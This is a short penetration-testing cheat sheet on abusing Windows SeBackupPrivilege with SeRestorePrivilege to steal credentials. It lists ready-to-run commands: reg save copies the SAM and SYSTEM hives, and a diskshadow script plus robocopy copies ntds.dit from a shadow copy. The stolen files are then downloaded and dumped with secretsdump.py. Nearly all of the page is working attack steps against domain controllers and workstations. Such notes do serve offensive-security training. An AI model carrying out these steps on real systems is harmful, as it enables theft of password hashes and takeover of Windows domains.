---
description: >-
  Sensitive files can be accessed (in combination with SeRestore privilege) with
  Built-in commands.
---

# SeBackup (with SeRestorePrivilege)

Check the site. \
[https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md](https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md) \
\
Check [SeRestorePrivilege](seretoreprivilege.md) if you need to enable the privilege.&#x20;

## SAM

```bash
# check privileges
> whoami /priv

# copy the sam and system files 
> cd C:\
> mkdir temp
> cd C:\temp
> reg save hklm\sam c:\Temp\sam
> reg save hklm\system c:\Temp\system

# file trasnfer
> download sam
> download system 

# dump sam secrets locally 
Kali> secretsdump.py -sam sam -system system LOCAL
```

## NTDS

```bash
# Create a dsh file
vi ntds.dsh 

set context persistent nowriters
add volume c: alias ntds
create
expose %ntds% z:

```

```bash
# file transfer
> cd C:\
> mkdir temp
> cd C:\temp
> upload ntds.dsh

# copy ntds.dit 
> diskshadow /s ntds.dsh
> robocopy /b z:\windows\ntds . ntds.dit 

# copy system 
> reg save hklm\system c:\Temp\system

# file transfer 
> download ntds.dit 
> download system 

# Dump ntds hashes locally 
secretsdump.py -ntds ntds.dit -system system local 
```

